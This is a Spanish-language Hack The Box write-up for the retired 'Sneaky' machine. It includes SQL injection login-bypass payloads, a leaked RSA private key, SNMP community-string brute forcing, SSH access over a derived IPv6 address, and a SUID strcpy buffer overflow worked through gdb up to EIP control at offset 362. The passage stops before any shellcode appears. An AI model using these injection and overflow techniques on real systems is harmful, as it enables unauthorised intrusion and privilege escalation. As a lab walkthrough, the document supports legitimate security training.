---
layout: post
title:  "Maquina  Retirada Sneaky de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada SNEAKY
tags: HTB, IPV6, SNMP, SQLInjecction, Web Hacking, BOF, Maquinas Retiradas, Writeup
---

# Sneaky ~ Hack The Box
```bash
$" nmap -p- --open -sS -T5 -v -n -Pn -oG allports 10.10.10.20       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Under Development!
```
Efectuamos un reconocimiento con la herramienta `whatweb` en el puerto `HTTP`:
```bash
# wtw 10.10.10.20                                                                                                            
http://10.10.10.20 [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.20], Title[Under Development!]
```
Haciendo FUZZING web:
```bash
#" wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt http://10.10.10.20/FUZZ    " 

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                   
=====================================================================
                                                                                 
000000810:   200        14 L     32 W       464 Ch      "dev"  
```
Encontramos un directorio, procedemos a hecharle un vistazo visual a la ruta y a la web:
vemos que es un Loguin super Cutre
Probamos con Injecciones sql Basicas
```sql
# admin' or 1=1-- -
# admin' or 1=1;-- -  	>>> Nos devuelve un user

			"	name: admin             "
			" 	name: thrasivoulos        "
```
Y una `Clave Id_rsa` (clave privada)

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5
Lc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr
3mi0MyfiGRh/Xr4L0+SwYdylkuX72E7rLkkigSt4s/zXp5dJmL2RBZDJf1Qh6Ugb
yDxG2ER49/wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn
cb+zfPcTvcP0t63kdEreQbdASYK6/e7Iih/5eBy3i8YoNJd6Wr8/qVtmB+FuxcFj
oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa
Nyp/9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR
h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G/8U/lcx1tiWfUNkLdC
CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX/cUcblPDdOmxvazpnP4PW1rEpW8cT
OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a
I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB
JkQxeUkCgYEA3RBR/0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz
5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY
ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt/MmoSaASbqpwhPSUCgYEA2uym
+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu
7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC
GR4wYcZF0iH/t4tn02qqOPaRGJAB3BD/B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne
aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q/tv7E3kT195MuS10J
VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x
hxNWWZcUFcRuxp5ogcvBdQKBgQDB/AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd
1/iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi/93oJa1on/QJlvbv4GO9y3LZ
LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG
UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k/
Hu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31
rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb
-----END RSA PRIVATE KEY-----
```
Como tenemos una clave SSH y el puerto 22 no nos aparece abierto (x reglas de firewall o iptables) para IPV4.
Pensamos que si conseguimos la direccion macc de la maquina podremos probar via IPV6 realizando el escaneo atraves de la macc para ipv6.

Vamos a hacer uso de herramientas como `SNMPWALK` 
Para ello vamos a enumerar un SERVICIO `UDP` llamado `SNMP`.
```bash
# nmap -p161 -sU --open -T5 -vvv -n -Pn 10.10.10.20           
PORT    STATE         SERVICE REASON
161/udp open|filtered snmp    no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.62 seconds
           Raw packets sent: 2 (149B) | Rcvd: 0 (0B)
```
Como vemos no nos reporta que este abierto correctamienta asique vamos a usar la herramienta `Onesixtyone` para hacer fuerza bruta a este servicio y encontrar
la Community-String
Vale pues buscando un Diccionario para averiguar la community Strings del servicio SNMP necesitamos hacer uso de otra herramienta que se llama ONESIXTYONE
```bash
# onesixtyone -c common-snmp-community-strings-onesixtyone.txt 10.10.10.20 
Scanning 1 hosts, 121 communities
10.10.10.20 [public] Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
10.10.10.20 [public] Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
```
Ahi la tenemos: `Linux Sneaky 4.4.0-75-generic`

Ahora procedemos a con la herramienta SNMPWALK 
```bash
# snmpwalk -v2c -c public 10.10.10.20
iso.3.6.1.2.1.1.1.0 = STRING: "Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (351310) 0:58:33.10
iso.3.6.1.2.1.1.4.0 = STRING: "root"
iso.3.6.1.2.1.1.5.0 = STRING: "Sneaky"
iso.3.6.1.2.1.1.6.0 = STRING: "Unknown"
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
``` 
Esto como vemos nos va a listar un monton de informacion! 
Y a nosotros nos interesa ver si podemos ver informacion de las INTERFACES 	para ver si podemos conseguir la MAC ADDRESS
Aparte para ello vamos a instalar una utilidad nueva para que nos traduzca el output de `SNMPWALK`
```bash
Instalandolo # apt install snmp-mibs-downloader -y 
``` 
Ahora volvemos a usar `SNMPWALK`
```bash
# snmpwalk -v2c -c public 10.10.10.20
SNMPv2-MIB::sysDescr.0 = STRING: Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (363286) 1:00:32.86
SNMPv2-MIB::sysContact.0 = STRING: root
SNMPv2-MIB::sysName.0 = STRING: Sneaky
SNMPv2-MIB::sysLocation.0 = STRING: Unknown
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.6 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.2 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.3 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (0) 0:00:00.00
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (1) 0:00:00.01
IF-MIB::ifNumber.0 = INTEGER: 2
IF-MIB::ifIndex.1 = INTEGER: 1
```
Otra Forma de sacar la MAC address:
```bash
# locate .nse |  grep snmp                                                                                                                         130 ⨯
/usr/share/nmap/scripts/snmp-brute.nse
/usr/share/nmap/scripts/snmp-hh3c-logins.nse
/usr/share/nmap/scripts/snmp-info.nse
/usr/share/nmap/scripts/snmp-interfaces.nse					ESTE SERIA EL BUENO, vamos a usarlo
/usr/share/nmap/scripts/snmp-ios-config.nse
/usr/share/nmap/scripts/snmp-netstat.nse
/usr/share/nmap/scripts/snmp-processes.nse
/usr/share/nmap/scripts/snmp-sysdescr.nse
/usr/share/nmap/scripts/snmp-win32-services.nse
/usr/share/nmap/scripts/snmp-win32-shares.nse
/usr/share/nmap/scripts/snmp-win32-software.nse
/usr/share/nmap/scripts/snmp-win32-users.nse
```
Aqui procedemos a usar el script de `NMAP` `snmp-interfaces.nse` 
```bash
# nmap --script snmp-interfaces.nse -p161 -sU -vvv -n 10.10.10.20 -oN t-SNMPInterfaces

PORT    STATE SERVICE REASON
161/udp open  snmp    script-set
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Status: up
|     Traffic stats: 8.93 Kb sent, 8.93 Kb received
|   eth0
|     IP address: 10.10.10.20  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:04:bd (VMware)						Aqui tenemos la MAC Adress
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Status: up
|_    Traffic stats: 8.07 Mb sent, 5.97 Mb received
```
Atraves de La Dirrecion MAC nosotros podemos:
- Computar la Unique Local Address
- Como?

Paso 1.- `# dead:beef : : 00:50:56:b9:04:bd `
Paso 2.- `# dead:beef : : 02:50:56ff:feb9:04:bd y faltaria dividirlo en pares de 4`
Paso 3 .- `# dead:beef::0250:56ff:feb9:04bd cuando tiene un 0 al principio se puede omitir`
Paso final 4.- `# dead:beef::250:56ff:feb9:04bd Esta seria la Unique Local Adress`

Y si probamos a enviarle una traza icmp por IPV6 vemos que nos responde correctamente.
```bash
# ping -c 10 dead:beef::250:56ff:feb9:04bd                                                                                                           2 ⨯
PING dead:beef::250:56ff:feb9:04bd(dead:beef::250:56ff:feb9:4bd) 56 data bytes
64 bytes from dead:beef::250:56ff:feb9:4bd: icmp_seq=1 ttl=63 time=77.8 ms
64 bytes from dead:beef::250:56ff:feb9:4bd: icmp_seq=2 ttl=63 time=39.5 ms
64 bytes from dead:beef::250:56ff:feb9:4bd: icmp_seq=3 ttl=63 time=39.7 ms
64 bytes from dead:beef::250:56ff:feb9:4bd: icmp_seq=4 ttl=63 time=39.5 ms
^C
--- dead:beef::250:56ff:feb9:04bd ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3010ms
rtt min/avg/max/mdev = 39.503/49.144/77.808/16.548 ms
```
Ahora con Nmap podriamos volver a hacer el escaneo del principio pero en este caso jugando con el parameto -6 para indicarle que es un escaneo via IPV6
```bash
# nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn dead:beef::250:56ff:feb9:04bd -6 -oG allportsIPV6

Scanning dead:beef::250:56ff:feb9:4bd [65535 ports]
Discovered open port 80/tcp on dead:beef::250:56ff:feb9:4bd
Discovered open port 22/tcp on dead:beef::250:56ff:feb9:4bd
Completed SYN Stealth Scan at 12:02, 12.34s elapsed (65535 total ports)
Nmap scan report for dead:beef::250:56ff:feb9:4bd

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```
Por lo que el siguiente paso ya seria establecer la conexion via `SSH` por `IPV6`

# Accediendo a la Maquina via MAC(Unique Local Address) por SSH en IPV6
Atraves de SSH por ipv6 con el user encontrado via injeccion sql en el loguin web y la Unique Local Adress computada atraves de la Mac obtenida con el script 
de nmap snmp-interfaces.nse

```bash
# ssh -i id_rsa thrasivoulos@dead:beef::250:56ff:feb9:4bd 
The authenticity of host 'dead:beef::250:56ff:feb9:4bd (dead:beef::250:56ff:feb9:4bd)' can't be established.
ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dead:beef::250:56ff:feb9:4bd' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed May 26 11:25:33 EEST 2021

  System load: 0.0               Memory usage: 4%   Processes:       176
  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
thrasivoulos@Sneaky:~$ 
```
Aqui conseguimos acceso correctamente, y el siguiente paso es leer la flag `user.txt`
```bash
thrasivoulos@Sneaky:~$ ls
user.txt
thrasivoulos@Sneaky:~$ cat user.txt 
9fe14f76222db23a770f201xxxxxxxxxx
```

# Escalada de privilegios via BufferOverFlow gracias a un binario SUID
```bash
thrasivoulos@Sneaky:~$ find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
" /usr/local/bin/chal		BOF Buffer Over Flow"
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
```
Procedemos a ejecutar el binario   "chal" y nos devuelve un segmentation Fault (Buffer over Flow)
Ahora la idea es ver que ocurre por detras en este programita para poder abusar de el mediante un Buffer Over Flow
Para ello vamos a convertirnos el codigo del binario en base64 para traernoslo a nuestra maquina y poder pasarle utilidades como “ltrace | strace | strings”
```bash
thrasivoulos@Sneaky:/usr/bin$ which chal | xargs base64 -w0
f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAIIMECDQAAABUEQAAAAAAADQAIAAJACgAHgAbAAYAAAA0AAAANIAECDSABAggAQAAIAEAAAUAAAAEA.. ETC ETC ... binario en BASE64 ... ETC ETC
```
Una vez copiado el base64 procedemos en nuestra maquina:
```bash
"echo “base64 de chall” | base64 -d >> chall"
"chmod +x chall"
"ltrace ./chall"
```
```bash
# ltrace ./chall                                                                                                                                   139 ⨯
__libc_start_main(0x804841d, 1, 0xffcc0374, 0x8048450 <unfinished ...>
strcpy(0xffcc0162, nil <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
```
Cuando se usa este funcion `strcpy` vemos que se puede abusar de ella (Es peligrosa, y potencialmente vulnerable)
```bash
# ./chall $(python -c 'print "A"*500') 
zsh: segmentation fault  ./chall $(python -c 'print "A"*500')
```
Aqui le pasamos 500 `A` y el programa peta.

Para instalar `gdb-peda` tiramos de `“apt”`
Posteriormente tendriamos que instalar "peda" desde https://github.com/longld/peda
`SEGUIR LOS PASOS DE PEDA`
Usamos gdb para pasarle el payload de 500 "A" y analizar la pila a bajo nivel con `gdb`
```bash
# gdb ./chall                                                                                                                                      139 ⨯
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./chall...
(No debugging symbols found in ./chall)
(gdb)  r $(python -c 'print "A"*500') 
Starting program: /home/pro/Escritorio/HTB/Sneaky/exploits/chall $(python -c 'print "A"*500')

Program received signal SIGSEGV, Segmentation fault.
"0x41414141" in ?? ()
(gdb) 
```
Tenemos el EIP Sobrescrito con nuestras `AAA'S`
Ahora cuantas `AAA..` tenemos que poner hasta llegar al EIP?
Eso lo calculamos de la siguiente forma:

Con `pattern_create 500`como comando creamos unos caracteres especiales para averiguar cuantas AAAA.. tenemos que poner hasta llegar al `EIP`
```bash
#gdb-peda$ pattern_create 500
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAAp
AATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%
MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2A
sHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'
```
Ahora le pasamos al programa estos caracteres especialmente creados por Pattern_create para detectar cuando se esta sobrescribiento el EIP
```bash
# gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAm
AARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%
LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGA
scAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'

Starting program: /home/pro/Escritorio/HTB/Sneaky/exploits/chall 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd730 --> 0x413673 ('s6A')
EDX: 0xffffd3a3 --> 0x413673 ('s6A')
ESI: 0xf7fa9000 --> 0x1e4d6c 
EDI: 0xf7fa9000 --> 0x1e4d6c 
EBP: 0x41712541 ('A%qA')
ESP: 0xffffd320 ("rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
EIP: 0x25415525 ('%UA%')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x25415525
[------------------------------------stack-------------------------------------]
0000| 0xffffd320 ("rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
0004| 0xffffd324 ("A%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
0008| 0xffffd328 ("%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
0012| 0xffffd32c ("uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
0016| 0xffffd330 ("A%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
0020| 0xffffd334 ("%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
0024| 0xffffd338 ("wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
0028| 0xffffd33c ("A%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6A")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
"0x25415525" in ?? ()
```
Ya tenemos el `Offset 0x25415525`, asique procedemos a usar `pattern_offset` para averiguar el numero de caracteres en Hexadecimal hasta sobrescribir el `EIP`
```bash
# gdb-peda$ pattern_offset 0x25415525
625038629 found at offset: "362"
```
Ahora vamos a verificar que tenemos el control del EIP para luego pasarle una direccion que apunte a un poco antes de nuestro `SHELLCODE`. 
Para ello vamos a ejecutar el siguiente comando:
```bash
gdb-peda$ r $(python -c 'print "A"*362 + "B"*4')
Starting program: /home/pro/Escritorio/HTB/Sneaky/exploits/chall $(python -c 'print "A"*362 + "B"*4')

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd730 --> 0x424242 ('BBB')
EDX: 0xffffd39d --> 0x424242 ('BBB')
ESI: 0xf7fa9000 --> 0x1e4d6c 
EDI: 0xf7fa9000 --> 0x1e4d6c "
EBP: 0x41414141 ('AAAA')"
ESP: 0xffffd3a0 --> 0x0 "
EIP: 0x42424242 ('BBBB')    "
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)

[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242

[------------------------------------stack-------------------------------------]
0000| 0xffffd3a0 --> 0x0 
0004| 0xffffd3a4 --> 0xffffd444 --> 0xffffd596 ("/home/pro/Escritorio/HTB/Sneaky/exploits/chall")
0008| 0xffffd3a8 --> 0xffffd450 --> 0xffffd734 ("COLORTERM=truecolor")
0012| 0xffffd3ac --> 0xffffd3d4 --> 0x0 
0016| 0xffffd3b0 --> 0xffffd3e4 --> 0xbaa14230 
0020| 0xffffd3b4 --> 0xf7ffdb40 --> 0xf7ffdae0 --> 0xf7fca3e0 --> 0xf7ffd980 --> 0x0 
